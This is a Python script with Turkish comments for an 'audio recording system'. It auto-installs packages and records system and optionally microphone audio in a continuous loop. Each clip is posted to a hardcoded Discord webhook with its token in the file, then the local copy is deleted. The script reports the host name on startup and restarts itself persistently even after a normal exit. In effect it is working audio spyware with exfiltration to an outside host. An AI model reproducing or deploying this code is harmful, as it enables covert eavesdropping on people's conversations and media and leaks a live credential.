import os
import sys
import time
import threading
import traceback
import logging
import subprocess
import platform
from datetime import datetime
import glob  # Dosya kalıpları için eklendi

# Öncelikle gerekli modüllerin kurulu olup olmadığını kontrol edelim
def ensure_module(module_name):
    """Gerekli modülün yüklü olduğundan emin ol, değilse yüklemeyi dene"""
    try:
        __import__(module_name)
        print(f"Module {module_name} is already installed.")
        return True
    except ImportError:
        print(f"Module {module_name} is not installed. Attempting to install...")
        try:
            # pip hatalarını görmek istiyorsanız, stdout ve stderr parametrelerini kaldırabilirsiniz
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", module_name],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"Successfully installed {module_name}")
            return True
        except Exception as e:
            print(f"Failed to install {module_name}: {e}")
            return False

# Gerekli modülleri kontrol et ve eksik olanları kur
print("Checking required modules...")
for module in ['requests', 'soundcard', 'soundfile', 'pyaudio', 'pydub', 'numpy', 'psutil']:
    ensure_module(module)

# Global olarak modülleri import et
import requests
import numpy as np
import psutil

# Ses işleme kütüphanelerini import et - hata olursa işlemi devam ettir
try:
    import soundcard as sc
except ImportError as e:
    print(f"WARNING: Failed to import soundcard: {e}")

try:
    import soundfile as sf
except ImportError as e:
    print(f"WARNING: Failed to import soundfile: {e}")

# Önemli: pydub'ı global olarak import ediyoruz
try:
    from pydub import AudioSegment
    PYDUB_AVAILABLE = True
except ImportError as e:
    print(f"WARNING: Failed to import pydub: {e}")
    PYDUB_AVAILABLE = False

# 'pyaudioop' C modülü normalde gerekli değil, pydub işlem yaparken kullanılabilir
# ama pydub zaten doğru şekilde kurulduğunda gerekirse yönetecektir
print("NOTE: Not attempting to import pyaudioop as it's not directly needed.")

# Log ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("audio_record.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AudioRecordingSystem")

# Yapılandırmayı yükle
def load_config():
    """config_audio.py dosyasından yapılandırmayı yükleme"""
    config = {
        # Varsayılan değerler
        "DEFAULT_RECORDING_DURATION": 60,
        "SAMPLE_RATE": 22050,
        "MP3_BITRATE": 32,
        "BIT_DEPTH": 16,
        "COMPRESS_AUDIO": True,
        "SEND_MIXED_AUDIO": False,
        "SEND_MIC_AUDIO": False,
        "SEND_SYSTEM_AUDIO": True,
        "AUDIO_WEBHOOK_URL": "https://discord.com/api/webhooks/1345212795515568138/_Owji5OJk2p9MzNX3gaIZJ5wZfItA3NTllHW16ee5g9zzEv7wK2E76vlFE3qbOITwRIs"
    }
    
    # config_audio.py'den ayarları yüklemeyi dene
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        sys.path.insert(0, script_dir)
        import config_audio
        logger.info("Found config_audio.py, loading settings...")
        
        # Yapılandırma değişkenlerini aktar
        for attr in dir(config_audio):
            if attr.isupper():  # Sadece büyük harfli (sabit) değişkenleri al
                config[attr] = getattr(config_audio, attr)
                logger.info(f"Loaded setting {attr} = {getattr(config_audio, attr)}")
    except ImportError as e:
        logger.warning(f"Error loading config_audio.py: {e}")
        logger.info("Using default settings")
    
    return config

def send_to_discord_async(file_path, config, label="Audio", timestamp=None):
    """Discord'a ses dosyasını arka planda gönderen fonksiyon - etiketleme özelliği ile"""
    def _send_and_cleanup():
        try:
            logger.info(f"[BACKGROUND] Sending {label} file to Discord: {file_path}")
            
            if not os.path.exists(file_path):
                logger.error(f"File does not exist: {file_path}")
                return
            
            # Dosyayı güvenli şekilde kopyalayarak işlem
            tmp_copy = None
            try:
                # Dosyayı geçici bir kopyaya kopyalayalım, böylece orijinal dosya üzerindeki kilitleme sorunlarından kaçınırız
                tmp_copy = f"{file_path}.tmp"
                with open(file_path, 'rb') as src_file:
                    with open(tmp_copy, 'wb') as dst_file:
                        dst_file.write(src_file.read())
                
                # Geçici kopya ile Discord'a gönder
                with open(tmp_copy, 'rb') as f:
                    files = {
                        'file': (os.path.basename(file_path), f, 'audio/mpeg' if file_path.endswith('.mp3') else 'audio/wav')
                    }
                    
                    # Eğer dışarıdan timestamp verilmişse onu kullan, yoksa şimdiyi kullan
                    message_timestamp = timestamp if timestamp else datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    payload = {
                        # Başlık formatı düzeltildi ve dış timestamp kullanıldı
                        'content': f"**{label}:** Recording taken at {message_timestamp}"
                    }
                    
                    response = requests.post(
                        config["AUDIO_WEBHOOK_URL"],
                        data=payload, 
                        files=files,
                        timeout=60
                    )
                    
                    if response.status_code in [200, 204]:
                        logger.info(f"[BACKGROUND] Audio file sent to Discord successfully: {file_path}")
                    else:
                        logger.error(f"[BACKGROUND] Failed to send to Discord. Status: {response.status_code}")
                        return
            
            except Exception as e:
                logger.error(f"[BACKGROUND] Error during file copy or upload: {e}")
                return
            
            # Başarılı gönderimden sonra 1 saniye bekle ve dosyaları temizle
            time.sleep(1)
            
            # Orijinal dosyayı ve geçici kopyayı temizle - birkaç deneme yap 
            for _ in range(3):
                try:
                    # Önce geçici kopya
                    if tmp_copy and os.path.exists(tmp_copy):
                        os.remove(tmp_copy)
                        
                    # Şimdi orijinal dosya
                    if os.path.exists(file_path):
                        os.remove(file_path)
                        logger.info(f"[BACKGROUND] Deleted file after sending: {file_path}")
                        break
                except Exception as e:
                    logger.warning(f"[BACKGROUND] Attempt to delete file failed, will retry: {e}")
                    time.sleep(1)  # Biraz bekle ve tekrar dene
            
        except Exception as e:
            logger.error(f"[BACKGROUND] Error in async upload: {e}")
            # Son temizlik denemesi
            try:
                if tmp_copy and os.path.exists(tmp_copy):
                    os.remove(tmp_copy)
            except:
                pass
    
    # Arka plan thread'i başlat
    upload_thread = threading.Thread(target=_send_and_cleanup)
    upload_thread.daemon = True  # Ana uygulama kapanırsa thread de kapanır
    upload_thread.start()
    logger.info(f"Started background upload for file: {file_path}")
    return True

def record_audio(config, duration=30):
    """Ses kaydı yapma fonksiyonu - hem mikrofon hem de sistem sesi kaydetme desteğiyle"""
    logger.info(f"Recording audio for {duration} seconds...")
    
    # Tutarlı zaman damgası oluştur - hem dosya isminde hem Discord mesajında kullanılacak
    start_time = datetime.now()
    timestamp_for_filename = start_time.strftime("%Y%m%d_%H%M%S")
    timestamp_for_display = start_time.strftime("%Y-%m-%d %H:%M:%S")
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    try:
        # İşlemi hızlandırmak için mikrofon ve sistem sesini paralel kaydetme
        mic_data = None
        system_data = None
        sample_rate = config["SAMPLE_RATE"]
        num_frames = int(sample_rate * duration)
        
        # Mikrofon ve sistem sesini paralel kaydedecek thread'ler için sonuçları saklama değişkenleri
        mic_result = {"data": None, "error": None}
        system_result = {"data": None, "error": None}
        
        # Mikrofon kayıt thread'i
        def record_from_mic():
            try:
                if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_MIC_AUDIO", False):
                    default_mic = sc.default_microphone()
                    if default_mic:
                        logger.info(f"Recording from microphone: {default_mic.name}")
                        with default_mic.recorder(samplerate=sample_rate) as mic_recorder:
                            mic_result["data"] = mic_recorder.record(numframes=num_frames)
                            logger.info(f"Microphone recording completed - Shape: {mic_result['data'].shape}")
            except Exception as e:
                mic_result["error"] = str(e)
                logger.error(f"Failed to record from microphone: {e}")
                traceback.print_exc()
        
        # Sistem sesi kayıt thread'i
        def record_from_system():
            try:
                if config.get("SEND_MIXED_AUDIO", False) or config.get("SEND_SYSTEM_AUDIO", False):
                    default_speaker = sc.default_speaker()
                    logger.info(f"Default speaker: {default_speaker.name}")
                    
                    # Tüm hoparlörleri kontrol et
                    all_speakers = sc.all_speakers()
                    selected_speaker = None
                    
                    for speaker in all_speakers:
                        try:
                            loopback_mic = sc.get_microphone(id=speaker.id, include_loopback=True)
                            selected_speaker = speaker
                            break
                        except Exception:
                            continue
                    
                    if selected_speaker is None:
                        selected_speaker = default_speaker
                    
                    try:
                        loopback_mic = sc.get_microphone(id=selected_speaker.id, include_loopback=True)
                        logger.info(f"Recording system audio from: {selected_speaker.name}")
                        
                        with loopback_mic.recorder(samplerate=sample_rate) as system_recorder:
                            system_result["data"] = system_recorder.record(numframes=num_frames)
                            logger.info(f"System audio recording completed")
                    except Exception as e:
                        logger.error(f"Error recording system audio: {e}")
                        
                        # Alternatif yöntem dene
                        if platform.system() == "Windows":
                            all_mics = sc.all_microphones(include_loopback=True)
                            stereo_mix_keywords = ['stereo mix', 'what u hear', 'loopback', 'virtual']
                            
                            for mic in all_mics:
                                mic_name = mic.name.lower()
                                if any(keyword in mic_name for keyword in stereo_mix_keywords):
                                    logger.info(f"Found alternative system audio device: {mic.name}")
                                    with mic.recorder(samplerate=sample_rate) as alt_recorder:
                                        system_result["data"] = alt_recorder.record(numframes=num_frames)
                                        logger.info("Alternative system audio recording completed")
                                    break
            except Exception as e:
                system_result["error"] = str(e)
                logger.error(f"Failed to record system audio: {e}")
                traceback.print_exc()
        
        # Kayıt thread'lerini oluştur ve başlat
        mic_thread = threading.Thread(target=record_from_mic)
        system_thread = threading.Thread(target=record_from_system)
        
        mic_thread.start()
        system_thread.start()
        
        # Thread'lerin tamamlanmasını bekle
        mic_thread.join()
        system_thread.join()
        
        # Thread'lerden sonuçları al
        mic_data = mic_result["data"]
        system_data = system_result["data"]
        
        # İşlenecek ses verilerini kontrol et
        if mic_data is None and system_data is None:
            logger.error("Failed to record any audio")
            return False
        
        # Dosya adlarında tutarlı zaman damgası kullan
        temp_mixed_wav = os.path.join(script_dir, f"temp_mixed_{timestamp_for_filename}.wav")
        temp_mic_wav = os.path.join(script_dir, f"temp_mic_{timestamp_for_filename}.wav") if mic_data is not None else None
        temp_system_wav = os.path.join(script_dir, f"temp_system_{timestamp_for_filename}.wav") if system_data is not None else None
        
        # Karışık ses oluştur (eğer hem mikrofon hem de sistem sesi varsa)
        mixed_data = None
        if mic_data is not None and system_data is not None and config.get("SEND_MIXED_AUDIO", False):
            try:
                logger.info("Creating mixed audio from microphone and system audio...")
                
                # Ses verilerinin boyutlarını kontrol et
                if len(mic_data) != len(system_data):
                    # Aynı uzunlukta değillerse kısalt
                    min_length = min(len(mic_data), len(system_data))
                    logger.info(f"Audio length mismatch. Mic: {len(mic_data)}, System: {len(system_data)}. Trimming to {min_length}")
                    mic_data = mic_data[:min_length]
                    system_data = system_data[:min_length]
                
                # Seslerin kanal sayısını kontrol et
                mic_channels = mic_data.shape[1] if len(mic_data.shape) > 1 else 1
                sys_channels = system_data.shape[1] if len(system_data.shape) > 1 else 1
                
                logger.info(f"Microphone channels: {mic_channels}, System channels: {sys_channels}")
                
                # Tek kanallı ses için şekil düzeltme
                if len(mic_data.shape) == 1:
                    mic_data = mic_data.reshape(-1, 1)
                    logger.info("Reshaped microphone data from 1D to 2D")
                if len(system_data.shape) == 1:
                    system_data = system_data.reshape(-1, 1)
                    logger.info("Reshaped system data from 1D to 2D")
                
                # Mikrofon ses seviyesini ayarla
                mic_boost = float(config.get("MIC_BOOST", 2.0))
                system_volume = float(config.get("SYSTEM_AUDIO_VOLUME", 1.0))
                
                logger.info(f"Applying mixing levels - Mic boost: {mic_boost}, System volume: {system_volume}")
                
                # Sistem sesinin çok düşük olmadığını kontrol et
                system_max = np.max(np.abs(system_data))
                if system_max < 0.01:  # Çok düşük sinyal
                    logger.warning(f"System audio is very weak: {system_max}. Increasing system volume.")
                    system_volume *= 5.0  # Ekstra yükseltme
                
                # Karıştırma işlemi - geliştirilmiş
                mic_boosted = mic_data * mic_boost
                system_adjusted = system_data * system_volume
                
                # Karıştırma öncesi ses seviyelerini logla
                logger.info(f"After adjustment - Mic max: {np.max(np.abs(mic_boosted))}, System max: {np.max(np.abs(system_adjusted))}")
                
                # Ses kanallarını eşleştir
                if mic_boosted.shape[1] != system_adjusted.shape[1]:
                    logger.info("Channel count mismatch, converting to match")
                    # Stereo'yu mono'ya veya mono'yu stereo'ya dönüştür
                    if mic_boosted.shape[1] > system_adjusted.shape[1]:
                        # Sistem mono, mikrofon stereo - sistemi stereo'ya çevir
                        system_adjusted = np.column_stack((system_adjusted, system_adjusted))
                    else:
                        # Mikrofon mono, sistem stereo - mikrofonu stereo'ya çevir
                        mic_boosted = np.column_stack((mic_boosted, mic_boosted))
                
                mixed_data = mic_boosted + system_adjusted
                
                # Olası clipping'i önlemek için normalizasyon
                if config.get("NORMALIZE_AUDIO", True):
                    max_value = np.max(np.abs(mixed_data))
                    logger.info(f"Mixed audio max value before normalization: {max_value}")
                    
                    if max_value > 0.95:  # Clipping'e yakınsa
                        mixed_data = mixed_data / max_value * 0.95  # %95 seviyesine normalleştir
                        logger.info(f"Normalized mixed audio to avoid clipping. New max: {np.max(np.abs(mixed_data))}")
                
                # Karışık sesi WAV olarak kaydet
                sf.write(temp_mixed_wav, mixed_data, sample_rate)
                logger.info(f"Created mixed audio file: {temp_mixed_wav}")
                
                # Ayrıca karışım bileşenlerini de ayrı ayrı WAV olarak kaydet (sadece kontrol amaçlı)
                if config.get("DEBUG", False):
                    debug_mic_wav = os.path.join(script_dir, f"debug_mic_{timestamp_for_filename}.wav")
                    debug_sys_wav = os.path.join(script_dir, f"debug_sys_{timestamp_for_filename}.wav")
                    
                    sf.write(debug_mic_wav, mic_boosted, sample_rate)
                    sf.write(debug_sys_wav, system_adjusted, sample_rate)
                    
                    logger.info(f"Created debug audio files for components")
                
            except Exception as e:
                logger.error(f"Error mixing audio: {e}")
                traceback.print_exc()
                mixed_data = None
        
        # Mikrofon sesini kaydet (isteniyorsa)
        if mic_data is not None and config.get("SEND_MIC_AUDIO", False):
            try:
                sf.write(temp_mic_wav, mic_data, sample_rate)
                logger.info(f"Saved microphone audio to: {temp_mic_wav}")
            except Exception as e:
                logger.error(f"Error saving microphone audio: {e}")
                temp_mic_wav = None
        
        # Sistem sesini kaydet (isteniyorsa)
        if system_data is not None and config.get("SEND_SYSTEM_AUDIO", False):
            try:
                sf.write(temp_system_wav, system_data, sample_rate)
                logger.info(f"Saved system audio to: {temp_system_wav}")
            except Exception as e:
                logger.error(f"Error saving system audio: {e}")
                temp_system_wav = None
        
        # Sıkıştırma işlemi - MP3 dönüşümü
        mp3_files = []
        
        # Karışık ses için MP3 dönüşümü
        if config.get("COMPRESS_AUDIO", True) and PYDUB_AVAILABLE:
            try:
                # Karışık ses MP3
                if temp_mixed_wav and os.path.exists(temp_mixed_wav):
                    mixed_mp3 = os.path.join(script_dir, f"mixed_{timestamp_for_filename}.mp3")
                    audio = AudioSegment.from_wav(temp_mixed_wav)
                    audio.export(mixed_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                    logger.info(f"Converted mixed audio to MP3: {mixed_mp3}")
                    mp3_files.append(("mixed", mixed_mp3))
                    
                # Mikrofon MP3
                if temp_mic_wav and os.path.exists(temp_mic_wav):
                    mic_mp3 = os.path.join(script_dir, f"mic_{timestamp_for_filename}.mp3")
                    audio = AudioSegment.from_wav(temp_mic_wav)
                    audio.export(mic_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                    logger.info(f"Converted microphone audio to MP3: {mic_mp3}")
                    mp3_files.append(("mic", mic_mp3))
                    
                # Sistem MP3
                if temp_system_wav and os.path.exists(temp_system_wav):
                    system_mp3 = os.path.join(script_dir, f"system_{timestamp_for_filename}.mp3")
                    audio = AudioSegment.from_wav(temp_system_wav)
                    audio.export(system_mp3, format="mp3", bitrate=f"{config['MP3_BITRATE']}k")
                    logger.info(f"Converted system audio to MP3: {system_mp3}")
                    mp3_files.append(("system", system_mp3))
            except Exception as e:
                logger.error(f"Error converting to MP3: {e}")
        
        # Discord'a gönderim işlemi
        files_to_send = []
        
        # Eğer MP3 dönüşümü başarılı olduysa MP3 dosyaları, değilse WAV dosyaları gönder
        if mp3_files:
            for audio_type, file_path in mp3_files:
                if audio_type == "mixed" and config.get("SEND_MIXED_AUDIO", False):
                    # "Mixed Audio" etiketi ile gönder
                    files_to_send.append(("Mixed Audio", file_path))
                elif audio_type == "mic" and config.get("SEND_MIC_AUDIO", False):
                    # "Microphone Audio" etiketi ile gönder
                    files_to_send.append(("Microphone Audio", file_path))
                elif audio_type == "system" and config.get("SEND_SYSTEM_AUDIO", False):
                    # "System Audio" etiketi ile gönder
                    files_to_send.append(("System Audio", file_path))
        else:
            # MP3 dönüşümü başarısız oldu, WAV dosyalarını gönder
            if temp_mixed_wav and os.path.exists(temp_mixed_wav) and config.get("SEND_MIXED_AUDIO", False):
                files_to_send.append(("Mixed Audio", temp_mixed_wav))
            if temp_mic_wav and os.path.exists(temp_mic_wav) and config.get("SEND_MIC_AUDIO", False):
                files_to_send.append(("Microphone Audio", temp_mic_wav))
            if temp_system_wav and os.path.exists(temp_system_wav) and config.get("SEND_SYSTEM_AUDIO", False):
                files_to_send.append(("System Audio", temp_system_wav))
        
        # Discord'a gönderim için tutarlı etiket ve zaman damgası kullan
        for label, file_path in files_to_send:
            logger.info(f"Sending {label} to Discord: {file_path}")
            # Aynı zaman damgasını gönderdiğimizden emin ol
            send_to_discord_async(file_path, config, label, timestamp_for_display)
        
        # Tüm geçici dosyaları temizle - arka plandaki gönderin işlemi kopyaları kullanacak
        try:
            # WAV dosyalarını hemen temizle
            for wav_file in [temp_mixed_wav, temp_mic_wav, temp_system_wav]:
                if wav_file and os.path.exists(wav_file):
                    try:
                        os.remove(wav_file)
                        logger.debug(f"Removed temporary WAV file: {wav_file}")
                    except:
                        pass
        except Exception as e:
            logger.debug(f"Error cleaning up temporary files: {e}")
        
        return True if files_to_send else False
        
    except Exception as e:
        logger.error(f"Recording failed: {e}")
        traceback.print_exc()
        return False

def continuous_recording():
    """Sürekli kayıt fonksiyonu - yeni arayüz ile bekleme olmadan"""
    logger.info("Starting continuous audio recording")
    config = load_config()
    
    # Aktif kayıt sayacı
    active_recordings = 0
    max_parallel = 2  # Aynı anda en fazla 2 kayıt işlemi olabilir (güvenlik için)
    
    while True:
        try:
            # Kayıt işlemini başlat
            logger.info("Starting new recording cycle immediately")
            success = record_audio(config, config["DEFAULT_RECORDING_DURATION"])
            
            if success:
                logger.info("Recording cycle completed successfully, continuing without delay")
            else:
                logger.warning("Recording cycle had some issues, continuing anyway")
                
                # Sadece hata durumunda kısa bir bekleme ekle (sistemin durmasını engellemek için)
                logger.info("Waiting 5 seconds after error before trying again")
                time.sleep(5)
            
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received. Stopping recording.")
            break
        except Exception as e:
            logger.error(f"Error in continuous recording: {e}")
            traceback.print_exc()
            # Hata durumunda biraz bekle, sistemin aşırı yüklenmesini engelle
            logger.info("Waiting 10 seconds after exception before continuing")
            time.sleep(10)

def reset_imports():
    """Modülleri tekrar yüklemeyi dener"""
    try:
        # Ses işleme modüllerini yeniden yüklemeyi dene
        global PYDUB_AVAILABLE
        
        # pydub modülünü tekrar yüklemeye çalış
        try:
            if 'pydub' in sys.modules:
                del sys.modules['pydub']
            
            from pydub import AudioSegment
            logger.info("Successfully reloaded pydub module")
            PYDUB_AVAILABLE = True
        except ImportError as e:
            logger.error(f"Failed to reload pydub: {e}")
            PYDUB_AVAILABLE = False
        
        return True
    except Exception as e:
        logger.error(f"Error resetting imports: {e}")
        return False

def send_error_webhook(message, config):
    """Hata durumunda Discord'a bildirim gönder"""
    try:
        if not config.get("SEND_ERROR_NOTIFICATION", True):
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = {
            'content': f"⚠️ **AUDIO RECORDING ERROR** ⚠️\n**Time:** {timestamp}\n**Error:** {message}\n**Action:** Attempting restart..."
        }
        
        requests.post(
            config.get("AUDIO_WEBHOOK_URL", ""),
            json=payload,
            timeout=10
        )
        logger.info("Sent error notification to Discord")
    except Exception as e:
        logger.error(f"Failed to send error notification: {e}")

def run_recording_system():
    """Ana ses kayıt sistemini çalıştır - içinde sürekli kayıt döngüsü barındırır"""
    try:
        # Başlangıç bilgisi göster
        logger.info("Audio Recording System starting...")
        logger.info(f"Python version: {sys.version}")
        logger.info(f"Working directory: {os.getcwd()}")
        
        # Yapılandırmayı yükle
        config = load_config()
        
        # pydub kullanılabilirliğini kontrol et
        if not PYDUB_AVAILABLE:
            logger.warning("pydub is not available. Will attempt to reinstall.")
            # pyaudioop ve pydub modüllerini kurma denemesi
            try:
                # Önce pydub'ı kaldır
                subprocess.check_call([sys.executable, "-m", "pip", "uninstall", "-y", "pydub"],
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Gerekirse PyAudio'yu yeniden yüklemeyi dene
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "--upgrade", "PyAudio"],
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Şimdi pydub'ı yükle
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "pydub"],
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Yeniden import etmeyi dene
                reset_imports()
            except Exception as e:
                logger.error(f"Error reinstalling audio modules: {e}")
        
        # Başlangıçta eski ses dosyalarını temizleme
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            for pattern in ['*.wav', '*.tmp', '*.mp3']:
                for file_path in glob.glob(os.path.join(script_dir, pattern)):
                    try:
                        # Dosya yaşını kontrol et - 1 saatten eski dosyaları temizle
                        file_age = time.time() - os.path.getmtime(file_path)
                        if file_age > 3600:  # 1 saat
                            os.remove(file_path)
                            logger.info(f"Cleaned up old file: {file_path}")
                    except Exception as e:
                        logger.warning(f"Could not clean up file {file_path}: {e}")
        except Exception as e:
            logger.warning(f"Error during initial cleanup: {e}")
        
        # Discord'a başlangıç bildirimi gönder
        if config.get("SEND_STARTUP_NOTIFICATION", True):
            try:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                payload = {
                    'content': f"🎙️ **AUDIO RECORDING STARTED**\n**Time:** {timestamp}\n**System:** {platform.node()}\n**Python:** {sys.version.split()[0]}"
                }
                
                requests.post(
                    config.get("AUDIO_WEBHOOK_URL", ""),
                    json=payload,
                    timeout=10
                )
            except Exception as e:
                logger.error(f"Failed to send startup notification: {e}")
        
        # Sürekli kayıt işlemini başlat
        continuous_recording()
        
        return True  # Başarıyla tamamlandı
    
    except Exception as e:
        logger.critical(f"Fatal error in recording system: {e}")
        traceback.print_exc()
        try:
            # Hatayı Discord'a bildir
            send_error_webhook(str(e), load_config())
        except:
            pass
        return False  # Hata oluştu

def restart_script():
    """Betiği yeniden başlat"""
    logger.info("Attempting to restart audio recording script...")
    
    try:
        # Şu anki Python yorumlayıcısını ve betik yolunu al
        python_executable = sys.executable
        script_path = os.path.abspath(__file__)
        
        # Yeni bir süreç olarak betiği başlat
        subprocess.Popen([python_executable, script_path])
        
        logger.info("Successfully initiated restart, exiting current process...")
        sys.exit(0)  # Mevcut süreci sonlandır
    except Exception as e:
        logger.error(f"Failed to restart script: {e}")
        return False

if __name__ == "__main__":
    print("=" * 50)
    print("AUDIO RECORDING SYSTEM STARTING")
    print("=" * 50)
    
    # Yeniden başlatma sayacı
    restart_count = 0
    max_restarts = 25  # Maksimum yeniden başlatma sayısı
    
    while restart_count < max_restarts:
        try:
            success = run_recording_system()
            
            if not success:
                restart_count += 1
                logger.warning(f"Recording system failed, restart attempt {restart_count}/{max_restarts}")
                
                # Yapılandırmayı yüklemeyi dene
                try:
                    config = load_config()
                    restart_delay = config.get("RESTART_DELAY", 30)
                except:
                    restart_delay = 30  # Varsayılan bekleme süresi
                
                # Hata bildirimini Discord'a gönder
                try:
                    send_error_webhook(f"Recording system failed (attempt {restart_count}/{max_restarts}), restarting in {restart_delay} seconds...", load_config())
                except:
                    pass
                
                logger.info(f"Waiting {restart_delay} seconds before restart...")
                time.sleep(restart_delay)
                
                # Bazı durumlarda restarting yaklaşımı daha güvenilir olabilir
                if restart_count >= 5:  # 5 denemeden sonra
                    logger.info("Using alternative restart method...")
                    restart_script()  # Bu fonksiyon başarılı olursa bu işlem sonlanacak
            else:
                # Normal çıkış durumu - bu durumda da yeniden başlat
                # Normal çıkış genellikle KeyboardInterrupt veya kullanıcı tarafından yapılan bir işlem olabilir
                logger.info("Recording system exited normally, will restart anyway")
                restart_count = 0  # Normal çıkışlarda sayacı sıfırla
                time.sleep(5)  # Kısa bir bekleme
        
        # Global exception handler - tüm beklenmeyen hataları yakalar
        except Exception as e:
            restart_count += 1
            logger.critical(f"Unhandled exception: {e}")
            traceback.print_exc()
            
            # Hata bildirimini Discord'a gönder
            try:
                send_error_webhook(f"Unhandled exception: {str(e)[:500]}...", load_config())
            except:
                pass
            
            logger.info(f"Waiting 30 seconds before restart attempt {restart_count}/{max_restarts}...")
            time.sleep(30)
    
    logger.critical(f"Maximum restart attempts ({max_restarts}) exceeded. Giving up.")
    
    # Son bir hata bildirimini Discord'a gönder
    try:
        send_error_webhook(f"Maximum restart attempts ({max_restarts}) exceeded. Audio recording stopped.", load_config())
    except:
        pass
